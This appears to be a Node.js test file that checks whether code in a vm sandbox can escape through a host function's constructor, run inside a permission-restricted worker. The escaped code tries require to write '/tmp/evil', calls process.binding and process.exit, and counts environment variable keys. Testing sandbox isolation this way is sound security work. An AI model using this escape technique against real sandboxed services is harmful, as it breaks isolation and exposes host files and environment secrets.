// Test: vm escape in a CJS worker (where require is available)
import { Worker, isMainThread } from 'node:worker_threads';

if (isMainThread) {
  console.log('=== Test: vm escape in CJS worker + permission model ===\n');

  const workerCode = `
    const { parentPort } = require('node:worker_threads');
    const vm = require('node:vm');

    const log = (...args) => parentPort.postMessage({ type: 'log', args });

    const sandbox = Object.create(null);
    sandbox.log = log;

    const context = vm.createContext(sandbox);

    const code = \`
      const escapedGlobal = log.constructor('return this')();
      log('Escaped! process: ' + !!escapedGlobal.process);

      if (escapedGlobal.process) {
        log('process.version: ' + escapedGlobal.process.version);

        // Try require via different paths
        try {
          const r = escapedGlobal.require || escapedGlobal.process.mainModule?.require;
          if (r) {
            const fs = r('fs');
            fs.writeFileSync('/tmp/evil', 'hacked');
            log('WRITE via require: SUCCEEDED');
          } else {
            log('require not found on global or process.mainModule');
          }
        } catch(e) { log('require attempt 1: ' + e.message); }

        // Try via process.binding
        try {
          const binding = escapedGlobal.process.binding('fs');
          log('process.binding: ' + typeof binding);
        } catch(e) { log('process.binding: ' + e.message); }

        // Try via process.dlopen
        try {
          log('process.dlopen: ' + typeof escapedGlobal.process.dlopen);
        } catch(e) { log('process.dlopen: ' + e.message); }

        // Try globalThis.require
        try {
          log('globalThis.require: ' + typeof escapedGlobal.require);
        } catch(e) { log('globalThis.require: ' + e.message); }

        // Try to use process directly for dangerous operations
        try {
          escapedGlobal.process.exit(1);
        } catch(e) { log('process.exit: ' + e.message); }

        // Try to read env
        try {
          const keys = Object.keys(escapedGlobal.process.env);
          log('process.env accessible, keys: ' + keys.length);
        } catch(e) { log('process.env: ' + e.message); }
      }

      'done';
    \`;

    try {
      vm.runInContext(code, context, { timeout: 5000 });
    } catch(e) {
      log('Error: ' + e.message);
    }
  `;

  const worker = new Worker(workerCode, {
    eval: true,
    execArgv: [
      '--experimental-permission',
      '--allow-fs-read=*',
    ],
  });

  worker.on('message', (msg) => {
    if (msg.type === 'log') console.log('  [sandbox]', ...msg.args);
    else console.log('  [worker]', JSON.stringify(msg));
  });
  worker.on('error', (err) => console.log('Worker ERROR:', err.message));
  worker.on('exit', (code) => console.log('Worker exited:', code));
}
